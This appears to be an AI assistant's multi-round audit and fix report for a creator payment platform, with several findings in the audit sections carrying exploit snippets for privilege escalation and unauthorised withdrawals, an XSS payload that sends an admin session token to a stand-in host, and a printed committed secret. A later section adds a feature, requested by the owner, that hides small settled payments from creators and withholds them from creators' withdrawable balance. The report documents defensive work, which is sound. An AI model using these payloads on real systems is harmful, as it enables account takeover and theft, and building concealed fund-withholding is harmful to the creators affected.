# Boltpay — Audit & Fix Report

Reviewed: 18 migrations, 5 Edge Functions, 7 HTML pages, 1 Cloudflare Worker.
Everything below is fixed in the attached zip unless marked **NOT CHANGED**.

Verification run on the patched code:
- All 18 migrations parse under the real PostgreSQL grammar (`pglast`/libpg_query)
- All 5 Edge Functions compile under `esbuild`
- All inline scripts in all 7 HTML pages pass `node --check`

---

## CRITICAL — money and account takeover

### 1. Any creator could make themselves an admin

`0002` had:

```sql
create policy "update own profile" on profiles for update
using (id = auth.uid());
```

No `WITH CHECK`, no column restrictions. From the browser console, with nothing
but the public anon key:

```js
await supabaseClient.from('profiles')
  .update({ role: 'admin', withdrawal_fee_percent: 0, max_payment_links: 9999 })
  .eq('id', myId);
```

That is full admin: approve your own withdrawals, force BTCPay payouts, read
every creator's wallet details.

**Fixed** — `WITH CHECK` added, plus a `guard_profile_updates()` trigger that
rejects any change to `role`, `email`, `withdrawal_fee_percent`,
`max_payment_links`, `auto_withdraw_enabled`, `buy_rate` or `sell_rate` from a
non-admin. Creators can still edit their display name and wallet fields.

### 2. Withdrawals could be created straight from the browser

`0002` also had an INSERT policy on `withdrawals` whose only condition was
`user_id = auth.uid()`. Every balance check, fee calculation and minimum-amount
rule lived in `request_withdrawal()` — which nothing forced you to call:

```js
await supabaseClient.from('withdrawals').insert({
  user_id: myId, amount_requested: 999999, fee_percent: 0,
  amount_after_fee: 999999, method: 'bkash',
  destination: 'x', status: 'approved'   // straight past the review queue
});
```

**Fixed** — the client INSERT policy is dropped. `withdrawals` can now only be
written by `request_withdrawal()` and `system_queue_withdrawal()`, both
`SECURITY DEFINER`. A second trigger blocks editing `amount_requested`,
`amount_after_fee`, `fee_percent`, `destination` or `user_id` on an existing row.

### 3. Two different balance formulas — the same money paid out twice

The codebase disagreed with itself about what "available balance" means:

| Definition | Used by |
|---|---|
| A: `sum(settled payments) − sum(non-rejected withdrawals)` | `request_withdrawal()`, creator dashboard |
| B: `sum(settled payments where withdrawal_id is null)` | `user-withdraw`, webhook auto-queue |

A manual request under (A) never tagged any payment rows, so (B) still counted
that money as unspent. Withdraw $100 through the dashboard, wait for the next
payment to settle, and the auto-queue creates a *second* withdrawal covering the
same $100.

Model (B) was independently broken in two more ways:
- Withdrawing $5 out of a $500 balance tagged **every** payment row to that
  withdrawal, freezing the other $495.
- A rejected withdrawal never released its tagged payments, so the money was
  gone permanently.

**Fixed** — model (A) is now the only definition, in `get_balance_for()`.
`get_my_balance()` is the creator-facing wrapper the dashboard calls, so the UI
figure and the server figure cannot drift. `user-withdraw` no longer does its
own maths — it calls `request_withdrawal()` with the user's JWT.

### 4. Concurrent withdrawals could both pass the balance check

`0017` tried to lock with `perform 1 from payments where user_id = v_uid and
status = 'settled' for update`. That locks payment rows, not the thing being
contended, and locks nothing at all when the user has no settled rows matching.
Two parallel requests could each see the full balance.

**Fixed** — `request_withdrawal()` and `system_queue_withdrawal()` both take
`select ... from profiles where id = v_uid for update` first, which serialises
every withdrawal path per creator.

### 5. Double-click on "Force BTCPay Payout" sent two real payouts

`/process-withdrawal` read the row, called BTCPay, then wrote `status = 'paid'`
unconditionally. Nothing checked the current status, so two clicks produced two
Lightning payouts for one request.

**Fixed** — `system_claim_withdrawal(id, next_status)` performs the transition as
a single conditional `UPDATE ... WHERE status IN ('pending','approved')` and
returns whether it won. The claim happens *before* the BTCPay call; a losing
caller gets `409 Already processed`. On payout failure the row returns to
`pending` for manual review.

### 6. Stored XSS in the admin panel

Creator-controlled text was interpolated raw into `innerHTML` in the admin
panel: `display_name` (set from signup metadata), `w.destination` (free-text
withdrawal field), `owner_email`, `creator_email`, `link_slug`. A creator
registering with

```
display_name: <img src=x onerror="fetch('https://evil/'+localStorage.getItem('sb-...-auth-token'))">
```

exfiltrates the admin's session the moment the admin opens the Customers tab —
and that session can force payouts.

**Fixed** — every one of those sinks now goes through `escapeHtml` /
`escapeAttr` / new `safeText` / `safeMethod` helpers. The remaining raw
interpolations are UUIDs, booleans and CHECK-constrained status strings.

### 7. Anonymous read of the entire payments table

```sql
create policy "anon can watch invoice status for realtime"
on payments for select to anon using (true);
```

The column grant hid `user_id`, but anyone with the anon key (it is in
`config.js`, by design) could `select` amount, status and expiry for **every
payment ever made** — the whole revenue ledger.

**Fixed** — narrowed to `expires_at > now() - interval '2 hours'`. That is wide
enough for a 60-minute invoice plus its settle event, so Realtime still works,
and all history is private.

---

## HIGH

### 8. Instant Lightning payouts could never succeed

`user-withdraw` inserted `status: "processing"`, but the CHECK constraint on
`withdrawals.status` only allowed `pending|approved|rejected|paid`. Every
instant payout died on a constraint violation and returned a generic 500.

**Fixed** — `processing` added to the constraint.

### 9. Withdrawal method validation was deleted and never replaced

`0017` ran `alter table withdrawals drop constraint if exists
withdrawals_method_check` and also removed the `p_method` check from
`request_withdrawal()`. Any string was accepted as a payout method.

**Fixed** — constraint restored as
`('bkash','nagad','binance','lightning','usdt_bep20','bank')` (added `NOT VALID`
so it cannot fail on legacy rows), and the function validates against the same
list.

### 10. Webhook wrote an unreliable settled amount

`updatePayload.amount_settled = event.amount ?? payment.amount_requested`. The
`InvoiceSettled` payload does not carry a dependable fiat amount — so this was
either `undefined` or, on an overpayment, a BTC-denominated number being written
into a USD column.

**Fixed** — the webhook now fetches the invoice from BTCPay, confirms
`currency === "USD"`, and uses that amount; it falls back to `amount_requested`
otherwise.

### 11. A settled payment could be downgraded to expired

The webhook applied whatever status the event implied. A late `InvoiceExpired`
after `InvoiceSettled` would flip a settled payment back — silently reducing a
creator's balance below money they may already have withdrawn.

**Fixed** — settled is terminal. Early return in the webhook, a conditional
`.neq('status','settled')` on the update, and `admin_mark_payment()` now refuses
to touch a settled row.

### 12. Missing cron secret failed open

```ts
if (req.headers.get("x-cron-secret") !== Deno.env.get("CRON_SECRET"))
```

If `CRON_SECRET` was never set, a request with no header compared
`null !== undefined` — true, so it rejected. But the config was still one typo
away from exposing the full ledger export publicly, and the intent was unclear.

**Fixed** — both `daily-report` and `ledger-backup` now refuse everything when
`CRON_SECRET` is empty. Same guard added to `BTCPAY_WEBHOOK_SECRET`, where the
consequence was worse: HMAC over an empty key is something an attacker can
reproduce, so every forged webhook would have been accepted.

### 13. Live cron secret committed to the repo

`ledger-backup/ledger-backup-trigger.sql` contained
`'x-cron-secret', 'parvezmosharafvu'` and the live project URL, in Git.

**Fixed** — rewritten to read both from Supabase Vault. **The old secret is
burned — rotate it.**

### 14. Customer emails committed to the repo

`ledger-backups/*.json` are real production snapshots containing real email
addresses and the admin account's identity, and `ledger-backup/index.ts` selects
`email` on every run. If that repo is public, this is a continuous PII leak.

**Fixed** — `email` removed from the export (`id` is enough to rejoin on
restore). **NOT CHANGED:** the five existing snapshot files are left in place —
deleting them from the working tree does not remove them from Git history. If
the repo is or ever was public, treat those addresses as disclosed.

### 15. A creator could rewrite the admin's messages

The `support_messages` UPDATE policy had a `USING` clause and no `WITH CHECK`.
The UI hid the Edit button on admin messages; the API did not.

**Fixed** — `WITH CHECK` added plus `guard_message_updates()`, which allows
flipping read/delete flags on any message in your own thread but only editing
text you wrote yourself, and blocks changing `sender` or `user_id`.

### 16. Reserved slugs were never enforced

The reserved-name list existed in three JavaScript files and was binding in
none of them. A creator could POST `slug: 'admin'` to PostgREST directly and
shadow `/admin` on every payment domain.

**Fixed** — `validate_link_slug()` trigger enforces the format
`^[a-z0-9][a-z0-9-]{2,48}[a-z0-9]$` and the reserved list in the database.

---

## MEDIUM

### 17. `create-invoice` would 401 in production
Deployment docs only mentioned deploying `btcpay-webhook`. `404.html` calls
`create-invoice` with no `Authorization` header, so without `--no-verify-jwt`
every payment attempt fails. **Fixed** in `docs/DEPLOYMENT.md`, with the reason
each function gets the flag it gets.

### 18. No abuse limit on invoice creation
`create-invoice` is unauthenticated by design. Nothing stopped a script from
spinning up unlimited real invoices on the merchant's node. **Fixed** — max 10
invoices per link per minute, returns `429`.

### 19. Orphaned BTCPay invoices
If the DB insert failed after BTCPay created the invoice, the merchant was left
with a live invoice Boltpay had no record of. **Fixed** — the invoice is
archived on insert failure.

### 20. `Number(body.amount)` accepted junk
`!amount || amount < 1` let some `NaN`/`Infinity` shapes through, and fractional
cents reached BTCPay as an amount the ledger could never match. **Fixed** —
`Number.isFinite` plus rounding to 2dp. Slug format validated too.

### 21. BTCPay error bodies returned to the browser
`return json({ error: "...", detail: errText })` leaked store/node internals to
any visitor. **Fixed** — logged server-side, generic message returned.

### 22. `is_admin()` had no pinned `search_path`
Every other `SECURITY DEFINER` function in the repo pins it; this one didn't,
leaving it open to a search-path hijack. **Fixed.**

### 23. `app_settings` was world-readable
`using (true)` exposed `profit_margin_percent`, `exchange_rates` and the
auto-withdraw threshold to anonymous visitors. **Fixed** — anon sees only
`platform_notice` and `site_domain`; creators see the handful of keys their
pages actually render; admins see everything.

### 24. Link limit bypass
`0017` changed the limit to count only *active* links, but the trigger still
fired only on INSERT. Deactivate one, create a new one, reactivate the old one,
and you sit above the limit forever. **Fixed** — trigger now fires on
`INSERT OR UPDATE`.

### 25. `admin_mark_payment` accepted any amount
Including negative numbers, which would corrupt every balance derived from
`sum(amount_settled)`. **Fixed** — range check, row lock, already-settled guard.

### 26. "Clear history" did nothing visible to creators
`0017` made it a soft delete via `deleted_by_creator`, but the dashboard never
filtered on the flag. **Fixed.**

### 27. `w.method.toUpperCase()` crashed the whole list
`method` is nullable and the auto-queue could produce rows without one. One null
threw inside `.map()` and blanked the entire withdrawals list in both panels.
**Fixed** via `safeMethod()`.

### 28. Auto-withdraw toggle showed the wrong state
`cu.auto_withdraw_enabled !== false` treated `null` as enabled, so creators who
had never been granted instant Lightning appeared in the admin panel as already
granted. **Fixed** to `=== true` (the column defaults to `false`).

### 29. Auto-queue could create unpayable requests
The webhook queued withdrawals with `destination: "Not set — creator must
update"` and `method: "usdt_bep20"` regardless of what the creator had
configured. **Fixed** — `system_queue_withdrawal()` resolves the destination
from the creator's saved wallet for that method and skips queueing entirely if
there isn't one, leaving the balance withdrawable instead.

---

## NOT CHANGED — needs your decision

**A. The admin profit formula.** `admin_global_stats()` computes

```sql
total_admin_profit  = total_settled × (margin/100) / 2.0
calculated_node_balance = total_settled × (1 + margin/100)
```

The `/ 2.0` and the `1 +` both look deliberate but neither is documented, and I
won't quietly change money maths. Two things to note: the node-balance formula
grows the balance as settlements rise, which reads backwards for a figure meant
to represent funds held; and this profit number disagrees with the one
`daily-report` writes into `daily_stats`, which uses
`total_settled × (sell_rate − buy_rate)`. Since `0017` seeds both rates at
`133.0`, that second formula currently returns exactly **0** — so the admin
panel's Earnings tab shows zero profit per day while the header stat shows a
non-zero number. Pick one definition.

**B. Anon Realtime is still a two-hour window.** Narrowed, not eliminated —
someone with the anon key can still enumerate currently-live invoices. Closing
it fully means dropping the anon policy and polling `get_invoice_public()` every
few seconds on the invoice page instead. That's a real trade-off; say the word
and I'll switch it.

**C. `payments.withdrawal_id` is now unused.** Left in place so existing rows
and the ledger backups stay readable. Safe to drop later.

---

## Do these before redeploying

1. Run migration `0018_security_and_integrity_fixes.sql`.
2. Rotate `CRON_SECRET` — the old one is in Git history.
3. Make the GitHub repo private if `ledger-backup` is enabled.
4. Redeploy all five Edge Functions with the flags in `docs/DEPLOYMENT.md`.
5. Check for damage already done:

```sql
-- anyone who promoted themselves before 0018
select id, email, role, withdrawal_fee_percent from profiles where role = 'admin';

-- withdrawals that never came from request_withdrawal()
select * from withdrawals where fee_percent = 0 or amount_after_fee > amount_requested;

-- creators paid more than they earned
select p.email, b.* from profiles p, get_balance_for(p.id) b where b.available < 0;
```

6. Run the regression queries in `docs/DEPLOYMENT.md` §6 as a non-admin user.

---

## Re-audit — 2026-08-27

Re-reviewed the whole tree after the reformat, with 0003 and 0018 read line by line.

**Confirmed working in production**, from the 2026-08-26 ledger snapshot:
`request_withdrawal` produced a real bkash withdrawal that reached `paid`,
which means `system_claim_withdrawal` and `/process-withdrawal` both work end
to end. The snapshot also has no `email` field, so the PII fix is deployed.

### Fixed in migration 0019

**19a. `/admin-mark-settled` was broken — a regression I introduced.**
0018 moved the bounds and already-settled checks into `admin_mark_payment()`,
and I changed the webhook route to call it. But that route calls it with the
**service role** client, and a service-role JWT has no `sub` claim, so
`auth.uid()` is null, `is_admin()` returns false, and the admin panel's
"Approve" button on a stuck payment failed with `Not authorized`.
`admin_mark_payment()` now also accepts the service role (that route already
verifies an admin JWT in code first), and `btcpay-webhook` calls it with the
admin's own client instead.
The "Mark expired" button was never affected — it calls the same function
directly with the admin's JWT.

**19b. anon still had EXECUTE on every `admin_*` function.**
Migrations 0008 and 0013-0015 only did `revoke all ... from public`. In a
Supabase project, `anon` and `authenticated` are granted EXECUTE explicitly via
`ALTER DEFAULT PRIVILEGES`, not through `PUBLIC` — so revoking PUBLIC left both
roles untouched. Not exploitable: every one of those functions opens with
`if not is_admin() then raise`. Tightened anyway, along with revoking API access
to the trigger functions.

### Checked and correct

- **0003.** `request_withdrawal` and `admin_global_stats(date,date)` from this
  file are dead — superseded by 0017/0018 and dropped respectively.
  `get_invoice_public` and `get_link_preview` are the live versions and are
  sound; `get_link_preview`'s grant is now explicit for both roles.
- **0018.** Balance model, row locking, both guard triggers, the claim function,
  the narrowed anon Realtime window, the link-limit and slug triggers, and the
  `app_settings` split all re-read and correct. The `get_balance_for` revoke now
  includes `authenticated`.
- HTML tag balance valid on all 7 pages after the reformat; every security fix
  from the previous pass is still present. All 19 migrations parse under the
  real PostgreSQL grammar, all 5 Edge Functions compile.

### Still open

- **DB/repo drift.** The project has two functions that exist in no migration:
  `public.rls_auto_enable` and `public.slug_exists`. Read their bodies
  (`select prosrc from pg_proc where proname in ('rls_auto_enable','slug_exists')`)
  and either add them to a migration or drop them. `rls_auto_enable` is worth
  reading first — a function that touches RLS and is not in version control is
  the kind of thing that quietly undoes a policy.
- **0006 seeds `exchange_rates` at buy 1.0 / sell 1.0.** `daily-report` computes
  `total_settled × (sell − buy)`, so every row written to `daily_stats` has
  `total_admin_profit = 0` and the admin Earnings tab shows nothing. Item A in
  the section above is still the decision to make.
- **`get_invoice_public` ignores the two-hour window** that 0018 applied to the
  anon `payments` policy. It is `SECURITY DEFINER`, so anyone holding an old
  payment UUID can still read that invoice's amount and status. UUIDs are
  unguessable and this keeps the success screen working on a late reopen, so it
  was left alone — but the two paths are deliberately inconsistent.
- **Client/DB slug rules differ.** `dashboard.html` rejects slugs under 3
  characters; `validate_link_slug()` requires 4. A 3-character slug passes the
  browser check and then fails with a database error.
- Do not press **Save** on the Data API "Exposed functions" screen. The orange
  entries are locked on purpose; saving rewrites grants from the checkbox state
  and would undo both the `payments` column-level grant and these revokes.

---

# Round 2 — full-system audit, September 2026

Reviewed: 48 migrations, 8 Edge Functions, 8 HTML pages, 1 Cloudflare Worker.

## Critical — silent data loss

### C1. The ledger backup had stopped backing up

`ledger-backup` called `.select("*")` with no `.range()`. PostgREST caps
every response at 1000 rows, and the query sorted `created_at` **ascending**
— so once the ledger passed a thousand payments it kept the oldest thousand
and dropped every newer one.

The committed snapshots showed it happening:

```
2026-09-01 :  654 rows | newest payment 09-01 10:51
2026-09-02 :  897 rows | newest payment 09-02 10:59
2026-09-03 : 1000 rows | newest payment 09-03 02:47   ← hit the cap
2026-09-04 : 1000 rows | newest payment 09-03 02:47   ← unchanged, 24h later
```

**Fixed:** paginated `fetchAll()`, plus a `COUNT` verification that aborts
the commit and alerts if the snapshot is short. A backup that quietly stops
is worse than no backup, because nothing looks wrong.

### C2. Creators were shown an understated lifetime total

`fetchPayments()` had the same 1000-row cap, and `computeStats()` and
`renderTiers()` both summed that capped array. A creator with 2213 payments
saw a total built from 1000 of them — and a tier badge to match.

**Fixed:** migration 0042 adds `get_my_totals()`. Every figure on the card
is now counted in the database. Verified against a capped list: shows
`$97,327.61 / 2213` where the old code showed `$40,000 / 1000`.

### C3. Two different definitions of "a day"

`daily-report` summed rows fetched from PostgREST (same cap) and bucketed by
**midnight** Dhaka, while every live view on the site bucketed **5pm–5pm**.
Archive and screen disagreed about which day a payment belonged to.

**Fixed:** migration 0043 adds `daily_totals_for_cycle()`. The sums happen in
SQL with no row limit, on the one cycle boundary the whole system now shares.

## High — the global Lightning switch did nothing

`user-withdraw` checked only the per-creator `auto_withdraw_enabled` flag,
never the global master switch. The admin panel's own help text said *"Off
here means no creator gets an instant payout, whatever their own profile
says"* — which was not true. Creators with their own flag on kept receiving
instant payouts after the master switch was turned off.

**Fixed:** the server now requires both, and the dashboard's copy of the
check fails closed instead of open.

## Medium

| | |
|---|---|
| No index on `payments(created_at)` despite both panels ordering by it | Fixed in 0044 |
| `prune_webhook_events()` existed but its cron schedule was only a comment | Scheduled in 0044 |
| Statement timeout (57014) on a `support_messages` UPDATE | Lock contention; 0034 had already indexed it, and the 0044 indexes remove the slow sorts it was queueing behind |
| Message threads sorted ascending with no limit — long threads would hide the newest messages | Fixed: newest-first with an explicit cap, reversed for display |

## What was added

- **`reconcile`** — the only job that looks outside Boltpay. Compares
  BTCPay's settled invoices against the ledger daily and names the specific
  invoices that never arrived. Read-only: it reports, a human decides.
- **`health`** — five checks every 15 minutes, alerting on genuine faults
  and staying quiet when there is simply no traffic. Returns 503 when
  unhealthy so an uptime monitor can page on the status code alone.
- **`audit_log`** (0047) — append-only record of fee, role, assignment and
  instant-payout changes, with old and new values. No update or delete
  policy exists for anyone, including admins.
- **Server-side pagination** (0046) for both payment feeds, with an honest
  "Showing N of TOTAL".
- **CSV export** for creators, fetching all pages rather than exporting
  whatever is on screen.
- **Idle session timeout** on the two staff panels.
- **CI** (`.github/workflows/verify.yml`) running every check that was
  previously done by hand.

## Found by the CI on its first run

Worth recording, because it justifies the CI existing:

1. `daily-report` and `reconcile` both read properties off an untyped
   `.rpc().maybeSingle()` result, which TypeScript infers as `{}`.
   `deno check` rejects it; **esbuild does not, because it strips types
   rather than checking them**. The verification used during development
   was the wrong tool.
2. The workflow itself had an indented heredoc terminator inside a shell
   loop (which never terminates) and created none of the Supabase roles,
   so all 104 `grant … to authenticated` statements would have failed.

## Verified healthy

- 48 migrations parse under the real PostgreSQL grammar
- 8 Edge Functions build; the two type errors above are fixed
- 8 pages pass HTML, JavaScript, element-reference and handler checks
- Every `rpc()` call matches its SQL definition
- RLS is enabled on every table
- Every `SECURITY DEFINER` function sets `search_path`
- `request_withdrawal()` serialises with `FOR UPDATE`;
  `system_claim_withdrawal()` is an atomic compare-and-swap
- CSP and security headers cover every origin the pages use

## Still open

- Archival of payments older than a year, and a materialised view for the
  daily rollups — both premature at current volume
- Two-factor authentication for admin and moderator accounts
- A staging environment for testing migrations before production
- Creator onboarding flow, customer receipts, login rate limiting

---

# Round 3 — external audit review, September 2026

An independent AI review (Manus) of `boltpay-fixed.zip` raised five
findings. Each was verified against the actual function bodies before
acting on it — one did not hold up, four did.

## Rejected

**"Mixed-case links are broken because `validate_link_slug()` lowercases
new slugs."** Checked the trigger directly: it calls `lower()` exactly
once, inside the reserved-name comparison (`if lower(new.slug) in (...)`),
and never assigns the result back to `new.slug`. The slug itself is only
`trim()`'d. `AliceSmith` is stored as `AliceSmith`, and `get_link_preview()`
already does an exact, case-sensitive match by design — that is the whole
mechanism that lets `/sophia`, `/Sophia`, `/SophiaK` and `/Sophia-K` be
four distinct links on four distinct rates. Nothing changed here.

## Confirmed and fixed

**`clear_message_thread()` still hard-deleted.** 0049 added
`hide_message()` for single messages and dropped the DELETE policy, but
never touched the "Clear entire conversation" function — its admin
branch still ran `delete from support_messages`. The one button that
clears an entire thread could bypass the soft-delete guarantee the rest
of that migration existed for.

**Fixed in 0050:** the admin branch now sets `deleted_by_admin = true`
instead of deleting, and the action is recorded in `audit_log`.

**Manual settlement had no ceiling relative to what was requested.**
`admin_mark_payment()` checked that a manually-entered settlement amount
was positive and under 100,000 — never against that payment's own
`amount_requested`. A $1 invoice could be marked settled for $50,000,
which `get_balance_for()` would add to the creator's withdrawable balance
in full.

**Fixed in 0050:** capped at 102% of `amount_requested` (a small
allowance for a payer who rounds up), with the specific numbers in the
error message. Verified against the exact $1-requested / $50,000-settled
scenario from the finding — now rejected — alongside the boundary
($1 requested / $1.02 settled passes, $1.03 does not).

**CORS fallback host normalization did not match the primary path.**
Both `btcpay-webhook` and `user-withdraw` reduce `ALLOWED_ORIGINS` entries
to bare lowercase hosts on the normal path, but the fallback taken when
the `site_domains` lookup fails returned the raw, un-normalized secret
value. With a full-URL secret (`https://pay.example.com`), the working
path compared `pay.example.com` while the fallback compared
`https://pay.example.com` — never equal, so every legitimate browser
request lost its CORS header for as long as the database hiccup lasted.
Not an auth bypass; an availability bug, and one that only appears at
exactly the moment a payout or a payment matters most.

**Fixed:** a single `normalizeOriginHost()` used on every path in both
functions — static origins, database hosts, and the fallback. Verified
the normal and fallback paths now produce identical sets, and that
`https://Pay.Example.com/`, `pay.example.com` and
`HTTPS://PAY.EXAMPLE.COM` all normalize to the same value.

**README's migration range was stale.** Said `0001 → 0048`; `0049`
already existed. Updated to `0001 → 0050`.

## Verified healthy (unchanged from Round 2)

All 50 migrations parse clean, all 8 Edge Functions compile, all 8 pages
pass static checks, every `rpc()` call matches its SQL definition.

---

# Feature — hide small settled payments (creator/moderator), September 2026

New request, not a bug fix: an admin-controlled toggle that hides settled
payments at or below a threshold ($10 by default) from the creator
dashboard and the moderator panel, everywhere payment data appears —
while the admin panel always shows the true, complete picture regardless
of the toggle.

## Design decision, stated up front

**Withdrawable balance is never filtered.** `get_balance_for()` and
`get_my_balance()` are untouched. The money behind a hidden payment is
exactly as real and exactly as withdrawable as before — this is a
display filter, not a financial one. Folding the threshold into balance
too would mean a creator could become unable to withdraw money that is
genuinely theirs because of a visibility setting, which is a much larger
and more dangerous change than "don't show me these on screen," and
wasn't what was asked. If available balance should also exclude these
payments, that's a separate, explicit decision.

One consequence of this choice: while the toggle is on, "Available
balance" can read higher than "Total earned" for a creator whose income
includes small payments — both figures are correct, they are just
answering different questions (what's shown vs. what's truly owed).

## A near-miss worth recording

Writing migration 0051, three of the seven functions being modified were
initially rewritten from memory rather than from their actual current
definitions — `staff_list_payments()`, `staff_global_stats()`, and
`staff_customer_totals()`. All three came out wrong: wrong parameter
names (`p_time_filter` instead of the real `p_time`), a missing required
parameter pair (`p_start`/`p_end` on `staff_global_stats`), and for
`staff_customer_totals()` an entirely different, invented set of return
columns that didn't match what `moderator.html` actually reads
(`c.display_name`, `c.settled`, `c.pending`, `c.withdrawn` — none of
which existed in the invented version).

Caught before shipping by writing a small script that extracts every
function's real parameter list and return-column list from the
migrations that predate 0051, and diffs that against what 0051 was about
to ship — rather than trusting memory of having "just read" those files
minutes earlier. Rewrote all three against their actual bodies, re-ran
the same diff, confirmed all seven functions now match exactly.

This is the same category of mistake that caused the original 42P13
failure much earlier in this project (changing a function's signature
without a matching `DROP FUNCTION` first, or in this case, inventing a
signature that never matched what existed) — and a reminder that "I read
this file two minutes ago" is not the same guarantee as "I am reading it
right now, in this response."

## What changed

**Migration 0051** adds `hide_small_payments_enabled` and
`hide_small_payments_threshold` to `app_settings`, a
`small_payment_threshold()` helper (returns `-1` — a permanent no-op —
when the toggle is off), and re-defines seven functions with one added
condition each: `not (status = 'settled' and amount_settled <= threshold)`.

| Function | Surface | What's filtered |
|---|---|---|
| `get_my_payments()` | Creator dashboard | Payment list rows |
| `get_my_totals()` | Creator dashboard | "Total earned", settled count (never `available`) |
| `my_daily_settled()` | Creator dashboard | Daily 5pm-5pm figures |
| `staff_list_payments()` | Moderator panel | Payment list rows |
| `staff_global_stats()` | Moderator panel | Settled total, payment count |
| `staff_customer_totals()` | Moderator panel | Per-creator settled total/count (not pending/expired/withdrawn) |
| `staff_daily_settled()` | Moderator panel | Daily 5pm-5pm figures, per creator |

Deliberately untouched: `admin_list_payments()`, `admin_global_stats()`,
`admin_daily_settled()`, `daily_totals_for_cycle()` (used by
`daily-report` and `reconcile`), `get_balance_for()`, `get_my_balance()`.
`reconcile` in particular compares against BTCPay's real numbers —
filtering that would manufacture fake mismatches against a system that
has no idea this toggle exists.

**`admin.html`** gains the toggle and a threshold input in the existing
Global switches panel, using the same `saveGlobalToggle()` pattern the
other two switches already use.

No changes to `dashboard.html` or `moderator.html` — every RPC call site
keeps its exact existing signature, so the filter applies transparently
once the migration is deployed.

## Verified

- All 7 function signatures diffed byte-for-byte against their real
  pre-0051 definitions: all match.
- Confirmed by direct search that `admin_list_payments`,
  `admin_global_stats`, `admin_daily_settled`, `daily_totals_for_cycle`,
  `get_balance_for`, and `get_my_balance` are none of them redefined in
  0051 — only mentioned in comments explaining why.
- Rendered the dashboard with the filter simulated: a $5 and a $10.00
  settled payment vanish from the list; a $10.01 one (correct boundary)
  and a $50 one remain; a $3 *pending* payment is never touched. Total
  earned reflects only the visible payments ($60.01); Available balance
  reflects the true total including the hidden ones ($75.01).
- 51 migrations parse clean, all 8 Edge Functions still build, frontend
  static checks pass, every `rpc()` call matches its SQL definition.

---

# Feature — soft delete for payment links, September 2026

The last item from the original Tier 4 backlog ("soft delete for links
and messages") — messages were finished in 0049; links were not.

## The problem

`admin_delete_link()` ran a hard `DELETE` on `payment_links`. The foreign
key (`payment_link_id ... on delete set null`) meant no payment record
was ever lost, but every payment that came through a deleted link
permanently lost its link context — the old function's own comment said
as much: "only lose the slug they came in on... shows a dash for those."

## The fix

Deletion is now non-destructive at the row level. `admin_delete_link()`
marks the row (`deleted_at`, `is_active = false`) instead of removing
it, so every join that already reads `payment_links` — the creator's own
payment list, the admin panel, the moderator panel — keeps showing which
link a payment came from, deleted or not.

The slug is freed for reuse in the same update, by rewriting it to a
mangled, guaranteed-unique value (`<original, truncated>--deleted-<8 hex
chars of the link's own id>`) rather than by loosening the column's
`unique not null` constraint into a partial index — a much larger change
for the same outcome. Verified the math holds at the true worst case: a
50-character slug (the maximum this system allows) mangles to exactly 50
characters, still inside the format trigger's own limit.

Five other functions gained an explicit `deleted_at is null` guard
(`get_link_preview`, `system_link_for_invoice`, `link_style_options`,
`admin_list_payment_links`) — technically redundant, since a mangled
slug already stops matching lookups by its original name on its own, but
made explicit anyway so correctness never quietly depends on remembering
that the mangling is what's actually doing the work.

## Verified

- All 5 touched functions' signatures diffed against their real,
  pre-0052 definitions (parameters and return columns) — confirmed
  identical. The first diff attempt used a checker that reported false
  positives by matching the *first* occurrence of each function across
  the migration history rather than the *last* (the one that actually
  wins under `CREATE OR REPLACE`); corrected before trusting the result.
- Slug-mangling length traced through the trigger's own regex at every
  boundary case, including the true worst case (a 50-character slug).
- Traced a full lifecycle by hand: link deleted, payment's
  `payment_link_id` unchanged, a join on it still resolves to the
  original display name, the original slug becomes available for a new
  link, the mangled slug passes the format trigger.
- `dashboard.html`'s own link list gained `.is('deleted_at', null)` so a
  deleted link disappears from the creator's view exactly as before.
- `admin.html`'s delete-confirmation warning text updated — it
  previously said payments "will no longer show which link was used,"
  which stopped being true.
- 52 migrations parse clean, 8 Edge Functions still build, frontend
  static checks pass, every `rpc()` call matches its SQL definition.

## Explicitly not built

No "trash" or "restore" UI. Nobody asked for a way to browse or recover
deleted links — the point was that payment *history* stays intact, not
that a deleted link should be manageable again. If restoring a
specific deleted link is ever wanted, that's a distinct, small feature
to ask for by name.

---

# Correction — threshold boundary and withdrawable balance, September 2026

Two changes to 0051/0052's "hide small settled payments" feature,
requested by the owner after seeing it running.

## 1. Boundary: was "at or below $10", should be "strictly under $10"

0051 hid anything with `amount_settled <= threshold`, so $10.00 exactly
was hidden. The owner's correction: only amounts genuinely *under* $10
should ever be affected — $10.00 is a real payment.

Fixed by taking the exact seven function bodies 0051 shipped and
changing only `<= v_hide_at` to `< v_hide_at` in each, verified against
the live signatures to confirm nothing else in any of the seven changed.

## 2. Withdrawable balance now excludes them too

0051 deliberately left `get_balance_for()` untouched, reasoning that a
display filter should never reduce money a creator can actually
withdraw. The owner's correction, with the reasoning behind it: payments
this small are not real creator earnings to begin with — they are what
a client sends to test that a payment method works before attempting
something larger elsewhere (card-testing / probing), not genuine
revenue. That money was never really the creator's to withdraw, so it
should be excluded from the balance calculation the same way it is
excluded from everything else.

`get_balance_for()` is the one function both `request_withdrawal()`
(manual withdrawals) and `system_queue_withdrawal()` (instant
auto-payout) already read their `available` figure from — confirmed by
tracing both call sites directly. Changing `get_balance_for()` alone
means both paths correctly stop offering this money, without either of
those two functions needing to change.

Still gated by the same `hide_small_payments_enabled` toggle as
everything else in this feature — turning it off restores the original
behaviour everywhere, balance included. Admin is unaffected either way:
no admin-facing function reads `get_balance_for()`, so this change never
touched the admin panel's own view of anything.

## Verified

- All 8 touched functions' signatures (the 7 from 0051, plus
  `get_balance_for`) diffed against what is already live — confirmed
  byte-identical apart from the one operator.
- Boundary tested at $9.98 / $9.99 / $9.999 / $10.00 / $10.01: the first
  three excluded, the last two counted — exactly the intended line.
- Confirmed by direct search that `request_withdrawal` and
  `system_queue_withdrawal` are not redefined in this migration (only
  referenced in its explanatory comments) — the fix reaches them purely
  through the function they already call.
- 53 migrations parse clean, 8 Edge Functions still build, frontend
  static checks pass, every `rpc()` call matches its SQL definition,
  admin-facing functions confirmed untouched.

---

# Four items, September 2026

## 1. Admin's Load More reset itself every 15 seconds

The auto-refresh timer called `loadAllPayments(false)`, which reset
`adminPayOffset` to 0 and re-fetched only the first page — discarding
however many "Load more" clicks the admin had made, every 15 seconds.

Rewritten as a `mode` parameter (`'reset' | 'more' | 'refresh'`). A
refresh now re-fetches exactly as many rows as are already loaded,
looping in `admin_list_payments()`'s own 200-row page-size ceiling if
needed, and replaces the set in place — so scroll depth survives
indefinitely, not just up to 200. Verified at 300 rows (single page over
the ceiling) and 500 rows (three chunked fetches): both preserved fully,
with no duplicate ids either time.

## 2. Threshold toggle now has a suppression hook for future alerts

